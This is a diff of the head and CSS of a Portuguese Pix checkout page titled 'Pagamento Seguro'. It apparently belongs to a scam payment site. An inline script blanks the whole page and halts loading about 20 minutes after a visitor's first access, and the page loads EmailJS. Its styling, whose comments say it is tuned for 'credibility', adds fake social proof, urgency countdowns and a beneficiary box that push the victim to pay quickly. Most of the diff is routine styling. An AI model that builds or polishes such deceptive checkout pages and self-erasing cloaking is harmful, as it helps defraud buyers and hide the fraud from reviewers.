@@ -3,7 +3,6 @@
 <head>
     <script>
 (function() {
-    // Configuração: 20 minutos em milissegundos
     const VINTE_MINUTOS = 20 * 60 * 1000; 
     const agora = new Date().getTime();
     
@@ -15,24 +14,19 @@
         const tempoDecorrido = agora - parseInt(primeiroAcesso);
 
         if (tempoDecorrido > VINTE_MINUTOS) {
-            // Remove todo o conteúdo do HTML e deixa a tela branca
             document.documentElement.innerHTML = "";
-            
-            // Força o fundo a ficar branco (caso o CSS do site tenha cores)
             document.documentElement.style.backgroundColor = "#ffffff";
-            
-            // Interrompe qualquer outro carregamento
             window.stop(); 
         }
     }
 })();
-</script>
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Opções de Pagamento | Pagamento Seguro</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
         :root {
             --primary: #0055ff;
@@ -251,6 +245,7 @@
             flex-direction: column;
             gap: 15px;
         }
+
         .payment-option-card {
             border: 2px solid var(--border-color);
             border-radius: 20px;
@@ -299,6 +294,9 @@
             font-size: 1.1rem;
             font-weight: 800;
             color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
         .payment-option-price {
@@ -359,6 +357,24 @@
             box-shadow: 0 0 0 4px rgba(0, 85, 255, 0.1);
         }
 
+        .input-check-icon {
+            position: absolute;
+            right: 14px;
+            bottom: 12px;
+            color: var(--success);
+            font-size: 1rem;
+            opacity: 0;
+            transform: scale(0.5);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            pointer-events: none;
+            z-index: 5;
+        }
+
+        .input-check-icon.visible {
+            opacity: 1;
+            transform: scale(1);
+        }
+
         .payment-action-btn {
             background: var(--primary);
             color: white;
@@ -383,6 +399,12 @@
             box-shadow: 0 6px 16px rgba(0, 85, 255, 0.3);
         }
 
+        .payment-action-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
         .pix-copy-section {
             display: none;
             flex-direction: column;
@@ -394,16 +416,16 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            background: rgba(50, 188, 173, 0.1);
+            background: rgba(40, 167, 69, 0.1);
             padding: 12px 15px;
             border-radius: 12px;
-            border: 1px solid rgba(50, 188, 173, 0.2);
+            border: 1px solid rgba(40, 167, 69, 0.2);
             position: relative;
             z-index: 1;
         }
 
         .pix-status-badge {
-            color: var(--primary);
+            color: var(--success);
             font-weight: 800;
             font-size: 0.85rem;
             display: flex;
@@ -426,6 +448,91 @@
             font-size: 1rem;
         }
 
+        /* ===== MELHORIAS DE UX: QR CODE E INSTRUÇÕES ===== */
+
+        .pix-qr-container {
+            background: white;
+            border: 2px solid var(--border-color);
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .pix-qr-label {
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--text-light);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        #qrCodeContainer {
+            background: white;
+            padding: 10px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+        }
+
+        #qrCodeContainer canvas {
+            display: block;
+            margin: 0 auto;
+        }
+
+        .pix-instructions-section {
+            background: linear-gradient(135deg, rgba(0, 85, 255, 0.05) 0%, rgba(0, 85, 255, 0.02) 100%);
+            border: 1px solid var(--primary-light);
+            border-radius: 14px;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .instructions-title {
+            font-size: 0.9rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .instructions-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .instructions-list li {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            font-size: 0.85rem;
+            color: var(--text-dark);
+            line-height: 1.4;
+        }
+
+        .instruction-number {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            font-weight: 800;
+            font-size: 0.75rem;
+            flex-shrink: 0;
+        }
+
         .pix-code-wrapper {
             background: #f8fafc;
             border: 2px dashed var(--pix-color);
@@ -434,29 +541,6 @@
             display: flex;
             flex-direction: column;
             gap: 0;
-        }
-
-        .btn-copy-pix {
-            background: #FFC107;
-            color: #1a1a1a;
-            border: none;
-            padding: 14px 20px;
-            border-radius: 25px;
-            font-weight: 800;
-            font-size: 0.95rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            width: 100%;
-        }
-
-        .btn-copy-pix:hover {
-            background: #FFB300;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(255, 193, 7, 0.3);
         }
 
         .pix-code-display-wrapper {
@@ -470,6 +554,8 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border-color);
         }
 
         .pix-code-label {
@@ -490,16 +576,8 @@
             display: flex;
             align-items: center;
             gap: 10px;
-            background: #f1f5f9;
-            border: 2px solid var(--border-color);
-            border-radius: 12px;
-            padding: 12px 14px;
-            transition: all 0.2s ease;
-        }
-
-        .pix-code-input-container:hover {
-            border-color: var(--primary);
-            box-shadow: 0 2px 8px rgba(50, 188, 173, 0.1);
+            padding: 12px 16px;
+            background: #f8fafc;
         }
 
         .pix-code-display-text {
@@ -529,12 +607,124 @@
         }
 
         .pix-copy-icon-btn:hover {
-            color: var(--primary);
-            transform: scale(1.1);
+            color: var(--primary-dark);
+            transform: scale(1.15);
         }
 
         .pix-copy-icon-btn.copied {
             color: var(--success);
+        }
+
+        .btn-copy-pix {
+            background: #FFC107;
+            color: #1a1a1a;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 25px;
+            font-weight: 800;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        .btn-copy-pix:hover {
+            background: #FFB300;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 193, 7, 0.3);
+        }
+
+        .btn-copy-pix:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* ===== BOTÃO DE AÇÃO PRINCIPAL (COPIAR E ABRIR BANCO) ===== */
+        .btn-copy-and-open {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+            border: none;
+            padding: 16px 20px;
+            border-radius: 14px;
+            font-weight: 800;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            box-shadow: 0 4px 12px rgba(0, 85, 255, 0.2);
+            margin-bottom: 10px;
+        }
+
+        .btn-copy-and-open:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 85, 255, 0.3);
+        }
+
+        .btn-copy-and-open:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* ===== STATUS DE PAGAMENTO EM TEMPO REAL ===== */
+        .payment-status-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            padding: 16px;
+            background: linear-gradient(135deg, rgba(40, 167, 69, 0.08) 0%, rgba(40, 167, 69, 0.04) 100%);
+            border: 1px solid rgba(40, 167, 69, 0.2);
+            border-radius: 14px;
+            margin-top: 15px;
+        }
+
+        .payment-status-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 0.85rem;
+            color: var(--text-dark);
+            font-weight: 600;
+        }
+
+        .payment-status-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.75rem;
+            flex-shrink: 0;
+        }
+
+        .payment-status-icon.pending {
+            background: rgba(255, 193, 7, 0.2);
+            color: #ff9800;
+        }
+
+        .payment-status-icon.confirmed {
+            background: rgba(40, 167, 69, 0.2);
+            color: var(--success);
+        }
+
+        .payment-status-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(0, 85, 255, 0.1);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
 
         .waiting-payment-section {
@@ -542,9 +732,10 @@
             align-items: center;
             justify-content: center;
             gap: 12px;
-            padding: 10px;
+            padding: 12px;
             background: rgba(0, 85, 255, 0.05);
             border-radius: 10px;
+            margin-top: 10px;
         }
 
         .modern-spinner {
@@ -625,31 +816,31 @@
             margin-top: 2px;
         }
 
-        .security-badges {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 5px;
-            opacity: 0.7;
-        }
-
-        .security-badge {
-            font-size: 0.65rem;
-            font-weight: 700;
-            color: var(--text-light);
-            display: flex;
+        .promo-badge {
+            background-color: rgba(40, 167, 69, 0.08);
+            color: #1e7e34;
+            border: 1px solid rgba(40, 167, 69, 0.2);
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            text-transform: none;
+            display: inline-flex;
             align-items: center;
-            gap: 4px;
+            justify-content: center;
+            line-height: 1;
+            height: 20px;
+            white-space: nowrap;
+            transition: all 0.2s ease;
         }
 
-        .security-badge i {
-            color: var(--success);
+        .payment-option-card:hover .promo-badge {
+            background-color: rgba(40, 167, 69, 0.12);
+            border-color: rgba(40, 167, 69, 0.3);
         }
 
         .delivery-warning-container {
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid var(--border-color);
             display: none;
             flex-direction: column;
             gap: 12px;
@@ -668,6 +859,12 @@
             display: flex;
             align-items: flex-start;
             gap: 10px;
+        }
+
+        .delivery-warning-text {
+            font-size: 0.8rem;
+            color: var(--text-dark);
+            line-height: 1.4;
         }
 
         @keyframes spin {
@@ -823,73 +1020,6 @@
             border-color: var(--primary);
         }
 
-        .input-check-icon {
-            position: absolute;
-            right: 14px;
-            bottom: 12px;
-            color: var(--success);
-            font-size: 1rem;
-            opacity: 0;
-            transform: scale(0.5);
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            pointer-events: none;
-            z-index: 5;
-        }
-
-        .input-check-icon.visible {
-            opacity: 1;
-            transform: scale(1);
-        }
-
-        .pix-input-group .input-check-icon {
-            bottom: 14px;
-        }
-
-        .btn-send-form {
-            background: var(--primary);
-            color: white;
-            margin-top: 10px;
-        }
-
-        .delivery-warning-container {
-            display: none;
-            flex-direction: column;
-            gap: 10px;
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid var(--border-color);
-        }
-
-        .payment-option-card.selected .delivery-warning-container {
-            display: flex;
-        }
-
-        .delivery-warning-box {
-            background: #fff7ed;
-            border: 1px solid #ffedd5;
-            padding: 12px;
-            border-radius: 12px;
-            display: flex;
-            gap: 10px;
-            color: #9a3412;
-            font-size: 0.8rem;
-            line-height: 1.4;
-        }
-
-        .delivery-warning-box i {
-            font-size: 1rem;
-            margin-top: 2px;
-        }
-
-        .spinner {
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
         .pix-error-msg {
             background: #fef2f2;
             border: 1px solid rgba(255, 59, 48, 0.2);
@@ -907,402 +1037,17 @@
             display: flex;
         }
 
-        /* Estilo Harmônico e Minimalista da Etiqueta Promoção */
-.payment-option-title {
-    display: flex;
-    align-items: center;
-    gap: 10px; /* Espaçamento equilibrado */
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    font-weight: 700;
-    color: #1a1a1a;
-}
-
-.promo-badge {
-    /* Fundo suave e translúcido para não pesar visualmente */
-    background-color: rgba(40, 167, 69, 0.08); 
-    color: #1e7e34; /* Verde mais escuro e legível */
-    
-    /* Borda fina para definição elegante */
-    border: 1px solid rgba(40, 167, 69, 0.2);
-    
-    padding: 2px 8px;
-    border-radius: 6px; /* Cantos levemente arredondados, mais sério e profissional */
-    
-    font-size: 11px;
-    font-weight: 600;
-    letter-spacing: 0.3px;
-    text-transform: none; /* Mantém a leitura natural (ex: Promoção) */
-    
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    line-height: 1;
-    height: 20px;
-    white-space: nowrap;
-    
-    /* Suavidade na transição */
-    transition: all 0.2s ease;
-}
-
-/* Efeito sutil ao passar o mouse no card pai (opcional) */
-.payment-option-card:hover .promo-badge {
-    background-color: rgba(40, 167, 69, 0.12);
-    border-color: rgba(40, 167, 69, 0.3);
-}
-
-/* Estilos da Seção Pedido - MELHORADOS PARA CREDIBILIDADE */
-.order-summary-section {
-    padding: 24px 20px;
-    background-color: #fff;
-    border-bottom: 1px solid var(--border-color);
-    animation: fadeIn 0.3s ease-out;
-}
-
-.order-summary-title {
-    font-size: 1.1rem;
-    font-weight: 800;
-    color: var(--text-dark);
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    margin-bottom: 20px;
-    letter-spacing: -0.3px;
-}
-
-.order-summary-title span {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-}
-
-.order-summary-title i {
-    color: var(--primary);
-    font-size: 1.2rem;
-}
-
-.order-summary-badge {
-    font-size: 0.7rem;
-    background: var(--primary-light);
-    color: var(--primary);
-    padding: 4px 10px;
-    border-radius: 20px;
-    font-weight: 700;
-    text-transform: uppercase;
-}
-
-.order-card {
-    display: flex;
-    gap: 18px;
-    background: #ffffff;
-    border: 1px solid #edf2f7;
-    border-radius: 18px;
-    padding: 16px;
-    transition: all 0.2s ease;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
-}
-
-.order-card:hover {
-    border-color: var(--primary-light);
-    box-shadow: 0 4px 15px rgba(0,0,0,0.04);
-}
-
-.order-image-container {
-    width: 85px;
-    height: 85px;
-    background: #f8fafc;
-    border-radius: 14px;
-    overflow: hidden;
-    flex-shrink: 0;
-    border: 1px solid #f1f5f9;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.order-image-container img {
-    width: 90%;
-    height: 90%;
-    object-fit: contain;
-}
-
-.order-details {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    gap: 6px;
-}
-
-.order-product-name {
-    font-size: 1rem;
-    font-weight: 700;
-    color: var(--text-dark);
-    line-height: 1.3;
-}
-
-.order-product-price-row {
-    display: flex;
-    align-items: baseline;
-    justify-content: space-between;
-    margin-top: 4px;
-}
-
-.order-product-price {
-    font-size: 1.15rem;
-    font-weight: 900;
-    color: var(--primary);
-    letter-spacing: -0.5px;
-}
-
-.order-product-qty {
-    font-size: 0.8rem;
-    color: var(--text-light);
-    font-weight: 600;
-}
-
-.order-info-container {
-    margin-top: 20px;
-    padding: 18px;
-    background: linear-gradient(to bottom right, #f8fafc, #ffffff);
-    border-radius: 18px;
-    border: 1px solid #edf2f7;
-    display: flex;
-    flex-direction: column;
-    gap: 14px;
-}
-
-.order-info-row {
-    display: flex;
-    align-items: flex-start;
-    gap: 12px;
-}
-
-.order-info-icon-wrapper {
-    width: 32px;
-    height: 32px;
-    background: #fff;
-    border-radius: 10px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.05);
-    flex-shrink: 0;
-}
-
-.order-info-icon-wrapper i {
-    font-size: 0.9rem;
-    color: var(--primary);
-}
-
-.order-info-content {
-    display: flex;
-    flex-direction: column;
-    gap: 2px;
-}
-
-.order-info-label {
-    font-size: 0.7rem;
-    font-weight: 700;
-    color: var(--text-light);
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-}
-
-.order-info-text {
-    font-size: 0.85rem;
-    font-weight: 600;
-    color: var(--text-dark);
-    line-height: 1.4;
-}
-
-        .order-info-text-delivery {
-    font-size: 0.85rem;
-    font-weight: 600;
-    color: #2D8A39; /* Verde de envio/logística */
-    line-height: 1.4;
-}
-
-.order-total-divider {
-    height: 1px;
-    background: dashed var(--border-color);
-    margin: 5px 0;
-    border-top: 1px dashed #cbd5e1;
-}
-
-        /* Estilos do Modal Pix Copiado - Design Profissional e Credibilidade */
-        .pix-modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(15, 23, 42, 0.7);
-            backdrop-filter: blur(12px);
-            z-index: 2000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-            overflow-y: auto;
-        }
-
-        .pix-modal-overlay.active {
-            display: flex;
-        }
-
-        .pix-modal-content {
-            background: white;
-            width: 100%;
-            max-width: 380px;
-            border-radius: 20px;
-            padding: 24px;
-            position: relative;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
-            animation: modalIn 0.3s ease-out;
-        }
-
-        .pix-modal-header {
-            text-align: center;
-            margin-bottom: 16px;
-        }
-
-        .pix-modal-header i {
-            font-size: 2rem;
-            color: #22c55e;
-            margin-bottom: 8px;
-        }
-
-        .pix-modal-header h2 {
-            font-size: 1.25rem;
-            font-weight: 800;
-            color: #0f172a;
-            margin-bottom: 4px;
-        }
-
-        .security-badge {
-  display: inline-flex;
-  align-items: center;
-  gap: 6px;                  /* Aumentado levemente para melhor legibilidade */
-  background: #f0fdf4;
-  color: #15803d;            /* Um tom acima para melhor contraste/acessibilidade */
-  padding: 4px 12px;         /* Proporção 1:3 para um visual pílula mais elegante */
-  border: 1px solid #dcfce7; /* Borda sutil para acabamento profissional */
-  border-radius: 9999px;
-  font-size: 0.75rem;        /* 12px é o padrão mínimo para legibilidade profissional */
-  font-weight: 600;          /* Semibold costuma ser mais limpo que Bold em fontes pequenas */
-  text-transform: uppercase; /* Opcional: traz um ar mais institucional/seguro */
-  letter-spacing: 0.025em;   /* Melhora a leitura em fontes pequenas */
-}
-        
-        .pix-instructions-list {
-            background: #f8fafc;
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 16px;
-            border: 1px solid #e2e8f0;
-        }
-
-        .pix-instructions-list ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .pix-instructions-list li {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 0.8rem;
-            color: #475569;
-            font-weight: 600;
-        }
-
-        .pix-instructions-list li i {
-            color: #0055ff;
-            font-size: 0.9rem;
+        .spinner {
             width: 20px;
-            text-align: center;
-        }
-
-
-        .pix-code-container-compact {
-            background: #f1f5f9;
-            border-radius: 10px;
-            padding: 8px;
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            border: 1px dashed #cbd5e1;
-        }
-
-        .pix-code-input-compact {
-            flex: 1;
-            background: transparent;
-            border: none;
-            font-family: monospace;
-            font-size: 0.75rem;
-            color: #64748b;
-            outline: none;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
-
-        .pix-copy-btn-compact {
-            background: #0f172a;
-            color: white;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 8px;
-            font-size: 0.75rem;
-            font-weight: 700;
-            cursor: pointer;
-            white-space: nowrap;
-        }
-
-        .payment-status-compact {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-bottom: 16px;
-            font-size: 0.75rem;
-            color: #64748b;
-            font-weight: 600;
-        }
-
-        .compact-spinner {
-            width: 14px;
-            height: 14px;
-            border: 2px solid #e2e8f0;
-            border-top-color: #0055ff;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.8s linear infinite;
         }
 
-        .pix-modal-close-compact {
-            width: 100%;
-            padding: 14px;
-            background: #0055ff;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 0.95rem;
-            font-weight: 800;
-            cursor: pointer;
-            box-shadow: 0 4px 6px -1px rgba(0, 85, 255, 0.2);
-            transition: all 0.2s;
-        }
-
-        .pix-modal-close-compact:active {
-            transform: scale(0.98);
-        }
-/* Fim Estilos do Modal Pix Copiado */
-        .pix-modal-overlay {
+        /* ===== CONFIRMAÇÃO DE PAGAMENTO ===== */
+        .payment-confirmation-modal {
             position: fixed;
             top: 0;
             left: 0;
@@ -1317,258 +1062,114 @@
             padding: 20px;
         }
 
-        .pix-modal-overlay.active {
+        .payment-confirmation-modal.active {
             display: flex;
         }
 
-        .pix-modal-content {
+        .payment-confirmation-content {
             background: white;
             width: 100%;
             max-width: 400px;
             border-radius: 24px;
-            padding: 30px;
+            padding: 40px 30px;
             position: relative;
             box-shadow: var(--shadow-lg);
             animation: modalIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .pix-modal-external-close {
-    position: absolute;
-    top: 15px;
-    right: 15px;
-    background: transparent; /* Fundo transparente para ser discreto */
-    border: none;
-    color: #94a3b8; /* Cor cinza suave */
-    font-size: 1rem; /* Tamanho levemente reduzido */
-    cursor: pointer;
-    opacity: 0.6; /* Mais transparente por padrão */
-    transition: all 0.2s ease;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 5px;
-    z-index: 10;
-}
-
-.pix-modal-external-close:hover {
-    opacity: 1;
-    color: #64748b; /* Escurece levemente ao passar o mouse */
-}
-
-        .pix-modal-header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .pix-modal-header i {
-            font-size: 3rem;
-            color: var(--success);
-            margin-bottom: 15px;
-            display: block;
-        }
-
-        .pix-modal-header h2 {
-            font-size: 1.4rem;
-            font-weight: 800;
-            color: var(--text-dark);
-        }
-
-        .pix-modal-text {
-            text-align: center;
-            color: var(--text-gray);
-            font-size: 0.95rem;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-
-        .pix-instructions-box {
-            background: #f8fafc;
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 20px;
-        }
-
-        .pix-instructions {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .pix-instructions li {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 0.85rem;
-            color: var(--text-dark);
-            font-weight: 600;
-        }
-
-        .pix-instructions li i {
-            color: var(--primary);
-            font-size: 1rem;
-            width: 20px;
             text-align: center;
         }
 
-        .pix-code-container {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .pix-code-input {
-            width: 100%;
-            padding: 12px;
-            background: #f1f5f9;
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
-            font-family: monospace;
-            font-size: 0.75rem;
-            color: var(--text-gray);
-            outline: none;
-        }
-
-        .pix-copy-btn {
-            background: var(--primary-light);
-            color: var(--primary);
-            border: none;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 0.9rem;
-            font-weight: 700;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            transition: all 0.2s;
-        }
-
-        .pix-copy-btn:hover {
-            background: var(--primary);
-            color: white;
-        }
-
-        .payment-status {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 25px;
-            padding: 12px;
-            background: #f0fdf4;
-            border-radius: 12px;
-            border: 1px solid #bbf7d0;
-        }
-
-        .payment-status .waiting-text {
-            color: var(--success);
-            font-weight: 700;
-            font-size: 0.85rem;
-        }
-
-        .pix-spinner {
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(34, 197, 94, 0.2);
-            border-top-color: #22c55e;
+        .confirmation-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, rgba(40, 167, 69, 0.1) 0%, rgba(40, 167, 69, 0.05) 100%);
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5rem;
+            margin: 0 auto 20px;
+            animation: scaleIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
-        .pix-modal-close {
+        @keyframes scaleIn {
+            from { transform: scale(0.5); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .confirmation-title {
+            font-size: 1.5rem;
+            font-weight: 900;
+            color: var(--success);
+            margin-bottom: 10px;
+        }
+
+        .confirmation-text {
+            font-size: 0.95rem;
+            color: var(--text-gray);
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .confirmation-details {
+            background: var(--bg-light);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .confirmation-detail-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .confirmation-detail-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .confirmation-detail-label {
+            font-weight: 600;
+            color: var(--text-gray);
+        }
+
+        .confirmation-detail-value {
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .btn-confirmation {
             width: 100%;
             padding: 16px;
             background: var(--primary);
             color: white;
             border: none;
-            border-radius: 14px;
+            border-radius: 12px;
             font-size: 1rem;
             font-weight: 800;
             cursor: pointer;
-            box-shadow: 0 4px 12px rgba(0, 85, 255, 0.2);
             transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(0, 85, 255, 0.2);
         }
 
-        .pix-modal-close:hover {
+        .btn-confirmation:hover {
             background: var(--primary-dark);
             transform: translateY(-2px);
         }
 
-        /* NOVOS ESTILOS DO CHECKOUT 2 PARA SEÇÃO PÓS-PIX */
-        .pix-screen{background:#f3f4f6;min-height:100vh;padding:16px 12px}
-        .pix-card{max-width:480px;margin:0 auto;background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.08)}
-        .progress-bar{height:4px;background:#e2e8f0;width:100%}
-        .progress-fill{height:100%;transition:width 1s linear}
-        .progress-fill.green{background:#22c55e}
-        .progress-fill.yellow{background:#f59e0b}
-        .progress-fill.red{background:#ef4444}
-        .pix-content{padding:24px}
-        .social-proof{display:flex;align-items:center;gap:8px;width:fit-content;margin:0 auto 16px;background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.2);padding:6px 14px;border-radius:999px;font-size:12px;font-weight:700;color:#16a34a}
-        .dot-pulse{width:8px;height:8px;border-radius:50%;background:#22c55e;animation:blink 1.2s infinite}
-        .pix-heading{text-align:center;font-size:20px;font-weight:800;color:#111;margin-bottom:4px}
-        .pix-subheading{text-align:center;font-size:13px;color:#64748b;margin-bottom:16px}
-        .timer-text{font-weight:800}
-        .timer-urgent{color:#dc2626;animation:pulse-scale 1s ease-in-out infinite}
-        .timer-warning{color:#d97706}
-        .status-badge-new{display:flex;align-items:center;gap:8px;width:fit-content;margin:0 auto 20px;padding:8px 18px;border-radius:999px;font-size:13px;font-weight:600}
-        .status-badge-new.waiting{background:rgba(245,158,11,.06);border:1px solid rgba(245,158,11,.2);color:#b45309}
-        .status-badge-new.urgent{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.2);color:#dc2626}
-        .amount-box-new{text-align:center;margin-bottom:20px}
-        .amount-label-new{font-size:13px;color:#64748b}
-        .amount-value-new{font-size:32px;font-weight:900;color:#dc2626}
-        .beneficiary-new{background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:12px;margin-bottom:20px;text-align:left}
-        .beneficiary-label-new{font-size:10px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:.5px}
-        .beneficiary-name-new{font-size:14px;font-weight:800;color:#111;margin-top:2px}
-        .beneficiary-hint-new{font-size:12px;color:#64748b;margin-top:2px}
-        .copy-btn-new{width:100%;border:none;border-radius:12px;padding:18px;font-size:16px;font-weight:900;color:#fff;background:#22c55e;cursor:pointer;box-shadow:0 4px 20px rgba(34,197,94,.3);transition:all .2s;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:8px}
-        .copy-btn-new:hover{filter:brightness(1.05)}
-        .copy-hint-new{text-align:center;font-size:12px;color:#94a3b8;margin-bottom:20px}
-        .bank-apps-new{margin-bottom:20px}
-        .bank-apps-title-new{text-align:center;font-size:11px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px}
-        .bank-grid-new{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
-        .bank-item-new{display:flex;flex-direction:column;align-items:center;gap:4px;border:1px solid #e2e8f0;background:#f8fafc;border-radius:10px;padding:10px 6px;text-decoration:none;transition:all .15s}
-        .bank-item-new:hover{box-shadow:0 2px 8px rgba(0,0,0,.06)}
-        .bank-icon-new{font-size:22px}
-        .bank-name-new{font-size:10px;font-weight:700;color:#64748b;text-align:center;line-height:1.2}
-        .divider-new{display:flex;align-items:center;gap:12px;margin-bottom:20px}
-        .divider-line-new{flex:1;height:1px;background:#e2e8f0}
